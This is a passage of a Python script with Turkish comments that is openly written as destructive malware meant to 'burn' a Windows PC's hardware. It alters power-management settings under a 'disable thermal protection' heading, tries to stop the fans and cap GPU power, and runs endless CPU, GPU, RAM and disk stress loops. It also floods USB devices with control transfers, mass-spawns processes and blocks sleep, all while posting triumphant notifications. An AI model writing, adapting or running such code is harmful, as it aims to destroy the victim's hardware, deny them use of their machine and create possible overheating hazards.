# ==========================================
# 1. TERMAL KORUMAYI KAPAT
# ==========================================
def disable_thermal():
    try:
        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True)
        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True)
        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True)
        send_notification("🔥 Termal koruma kapatıldı!")
    except Exception as e:
        send_notification(f"❌ Termal koruma hatası: {e}")

# ==========================================
# 2. FANLARI DURDUR
# ==========================================
def stop_fans():
    try:
        import wmi
        c = wmi.WMI()
        for fan in c.Win32_Fan():
            try:
                fan.SetSpeed(0)
                send_notification("🌀 Fan durduruldu!")
            except:
                pass
    except:
        pass
    
    try:
        subprocess.run('speedfan.exe /P0', shell=True, capture_output=True)
    except:
        pass
    
    try:
        subprocess.run('nvidia-smi -pl 50', shell=True, capture_output=True)
    except:
        pass

# ==========================================
# 3. CPU YAK
# ==========================================
def cpu_killer():
    while True:
        x = 3.14159
        for _ in range(1000000):
            x = x ** 1.00001
            x = x / 1.000001
        arr = [i ** i for i in range(5000)]
        for _ in range(100):
            arr.sort()
            arr.reverse()

# ==========================================
# 4. GPU YAK (Pygame ile)
# ==========================================
def gpu_killer():
    try:
        import pygame
        import numpy as np
        pygame.init()
        screen = pygame.display.set_mode((1920, 1080), pygame.FULLSCREEN)
        while True:
            for _ in range(50):
                img = np.random.rand(1920, 1080, 3) * 255
                surf = pygame.surfarray.make_surface(img)
                screen.blit(surf, (0, 0))
                pygame.display.flip()
    except:
        while True:
            try:
                subprocess.Popen(["cmd", "/c", "start", "calc.exe"])
                subprocess.Popen(["cmd", "/c", "start", "mspaint.exe"])
            except:
                pass

# ==========================================
# 5. ANAKART YAK (USB ile)
# ==========================================
def motherboard_killer():
    try:
        import usb.core
        for dev in usb.core.find(find_all=True):
            try:
                for _ in range(10000):
                    dev.ctrl_transfer(0x40, 0x0A, 0, 0, b'\x00' * 4096)
            except:
                pass
    except:
        pass

# ==========================================
# 6. PSU YAK
# ==========================================
def psu_killer():
    def disk_killer():
        while True:
            try:
                with open("C:\\temp.bin", "wb") as f:
                    f.write(b'\x00' * (1024 * 1024 * 100))
                os.remove("C:\\temp.bin")
            except:
                pass
            time.sleep(0.01)
    
    for _ in range(8):
        threading.Thread(target=disk_killer, daemon=True).start()
    
    for _ in range(20):
        try:
            subprocess.Popen(["cmd", "/c", "start", "calc.exe"])
        except:
            pass

# ==========================================
# 7. RAM YAK
# ==========================================
def ram_killer():
    while True:
        try:
            big_list = []
            for _ in range(2000000):
                big_list.append("x" * 2048)
            big_list.clear()
            del big_list
        except:
            pass

# ==========================================
# 8. KAPANMAYI ENGELLE
# ==========================================
def prevent_shutdown():
    while True:
        try:
            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
        except:
            pass
        time.sleep(5)

# ==========================================
# 9. GÜÇ TUŞUNU İPTAL ET
# ==========================================
def prevent_power_button():
    try:
        ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
        send_notification("🔌 Güç tuşu iptal edildi!")
    except:
        pass

# ==========================================
# 10. ANA
# ==========================================
if __name__ == "__main__":
    send_notification("🚀 SİSTEM YAKMA BAŞLATILDI!")
    
    disable_thermal()
    stop_fans()
    prevent_power_button()
    
    # CPU
    core_count = multiprocessing.cpu_count()
    thread_count = core_count * 8
    send_notification(f"🧠 CPU: {core_count} çekirdek, {thread_count} thread")
    for _ in range(thread_count):
        threading.Thread(target=cpu_killer, daemon=True).start()
    
    # GPU
    threading.Thread(target=gpu_killer, daemon=True).start()
    send_notification("🖥️ GPU render başlatıldı!")
    
    # Anakart
    threading.Thread(target=motherboard_killer, daemon=True).start()
    send_notification("🔌 Anakart USB zorlama başlatıldı!")
    
    # PSU
    threading.Thread(target=psu_killer, daemon=True).start()
    send_notification("⚡ PSU zorlama başlatıldı!")
    
    # RAM
    for _ in range(2):
        threading.Thread(target=ram_killer, daemon=True).start()
    send_notification("💾 RAM zorlama başlatıldı!")
    
    # Kapanmayı engelle
    threading.Thread(target=prevent_shutdown, daemon=True).start()
    send_notification("🔒 Kapanma engellendi!")
    
    send_notification("🔥 TÜM SİSTEM YANIYOR!")
    
    while True:
        time.sleep(60)
